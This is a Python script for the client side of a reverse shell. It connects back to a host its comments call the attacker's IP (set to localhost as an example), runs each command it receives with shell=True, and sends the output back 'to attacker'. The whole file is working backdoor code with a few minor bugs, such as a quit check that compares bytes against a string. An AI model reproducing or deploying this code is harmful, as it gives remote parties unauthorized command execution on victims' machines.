import socket
import subprocess
import os

HOST = "localhost"  # attacker's IP adress (this is a random one, just to show you)
PORT = 12345  # attacker's port on which server is listening

# same syntax here as for the server
connexion_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
connexion_socket.connect((HOST, PORT))
print("\n[*] Connected to " + HOST + " on port " + str(PORT) + ".\n")

while True:
	command = connexion_socket.recv(1024)
	decoded_command = command.decode('utf-8')
	print("Received command : " + str(command))

	# if its quit, then break out and close socket
	if command == "quit":
		break
		connexion_socket.close()

	if(decoded_command.split()[0] == "cd"):
			if len(decoded_command.split()) == 1:
				connexion_socket.send(bytes(os.getcwd(), 'utf-8'))
			elif len(decoded_command.split()) == 2:
				try:
					os.chdir(os.path.join(os.getcwd(), decoded_command.split()[1]))
					connexion_socket.send(bytes("Changed directory to " + os.getcwd(), 'utf-8'))
				except(WindowsError):
					connexion_socket.send(bytes("No such directory : " + os.getcwd(), 'utf-8'))

	else:
		# do shell command
		proc = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		# read output
		stdout_value = proc.stdout.read() + proc.stderr.read()
		print(stdout_value.decode('utf-8') + "\n")
		# send output to attacker
		if(stdout_value.decode('utf-8') != ""):
			connexion_socket.send(stdout_value)
		else:
			connexion_socket.send(command + bytes(" does not return anything", 'utf-8'))


connexion_socket.close()